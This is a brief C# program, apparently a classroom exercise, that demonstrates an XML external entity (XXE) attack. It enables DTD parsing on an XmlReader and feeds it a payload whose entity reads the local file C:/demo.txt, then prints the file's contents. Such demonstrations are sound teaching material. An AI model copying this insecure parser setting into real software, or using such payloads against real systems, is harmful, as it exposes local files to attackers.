using System;
using System.IO;
using System.Xml;

namespace A4___Exercise
{
    class Program
    {
        static void Main(string[] args)
        {
            string xxePayload = "<!DOCTYPE doc [<!ENTITY win SYSTEM 'file:///C:/demo.txt'>]>" 
                     + "<doc>&win;</doc>";
            string xml = "<?xml version='1.0' ?>" + xxePayload;
                    
            XmlReaderSettings rs = new XmlReaderSettings();
            rs.DtdProcessing = DtdProcessing.Parse;

            XmlReader myReader = XmlReader.Create(new StringReader(xml),rs);
                    
            while (myReader.Read())
            {
                Console.WriteLine(myReader.Value);
            }
            Console.ReadLine();
        }
    }
}
